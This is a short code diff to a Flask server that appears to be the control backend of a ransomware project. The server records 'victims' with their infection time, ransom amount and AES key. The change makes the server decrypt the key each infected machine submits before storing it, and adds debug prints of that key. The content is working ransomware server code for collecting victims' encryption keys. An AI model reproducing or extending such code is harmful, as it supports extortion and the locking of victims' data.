@@ -1,9 +1,10 @@
 import uuid
-
+from encry_decry import decrypt_key
 from flask import Flask, jsonify, request
 from flask_cors import CORS
 from db import victims
 import time
+from base64 import b64decode,b64encode
 
 V = victims()
 
@@ -43,14 +44,16 @@ def add_victim():
     #     return '400 Not Json'
     post_data = request.get_json()
     response_object = {'status': 'success'}
+    print(type(post_data.get('AES_key')))
+    print(post_data.get('AES_key'))
     V.vicList.append({
             # 'id': uuid.uuid4().hex,
             'id': post_data.get('id'),
             'inf_time': time.ctime(),
             'ransom': post_data.get('ransom'),
-            'AES_key': post_data.get('AES_key')
+            'AES_key': decrypt_key(post_data.get('AES_key'))
         })
-    V.new_victim(vid=post_data.get('id'), pkey=post_data.get('AES_key'))
+    V.new_victim(vid=post_data.get('id'), pkey=decrypt_key(post_data.get('AES_key')))
     response_object['message'] = 'Victim added!'
     return jsonify(response_object)
 
